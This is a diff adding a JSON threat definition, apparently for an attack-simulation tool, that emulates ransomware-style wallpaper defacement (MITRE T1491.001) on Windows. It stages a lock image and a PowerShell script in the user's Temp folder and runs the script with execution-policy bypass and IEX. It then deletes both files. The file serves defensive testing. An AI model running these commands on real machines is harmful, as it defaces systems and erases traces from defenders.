@@ -1,0 +1,60 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Changes desktop wallpaper",
+        "display_name": "T1491_001 - Change Wallpaper",
+        "name": "T1491_001 - Change Wallpaper",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "{\"--cp\":\"127.0.0.1:443\",\"--secure\":true,\"--multipart\":10240,\"--heartbeat\":1}",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "2": {
+                "module": "downloader",
+                "request": "--src VFS:/shared/Ransomware/lockedlowres.jpg --dest %USERPROFILE%/AppData/Local/Temp/desktop.jpg",
+                "type": "message"
+            },
+            "3": {
+                "module": "downloader",
+                "request": "--src VFS:/shared/Ransomware/wallchange.ps1 --dest %USERPROFILE%/AppData/Local/Temp/wallchange.ps1",
+                "type": "message"
+            },
+            "4": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "5": {
+                "module": "run",
+                "request": "powershell Set-ExecutionPolicy Bypass; IEX -command $ENV:UserProfile\\appdata\\local\\temp\\wallchange.ps1",
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell -executionpolicy bypass -file \"%USERPROFILE%/AppData/Local/Temp/wallchange.ps1\"",
+                "type": "message"
+            },
+            "7": {
+                "module": "run",
+                "request": "powershell Remove-Item \"%USERPROFILE%/AppData/Local/Temp/wallchange.ps1\"",
+                "type": "message"
+            },
+            "8": {
+                "module": "run",
+                "request": "powershell Remove-Item \"%USERPROFILE%/AppData/Local/Temp/desktop.jpg\"",
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
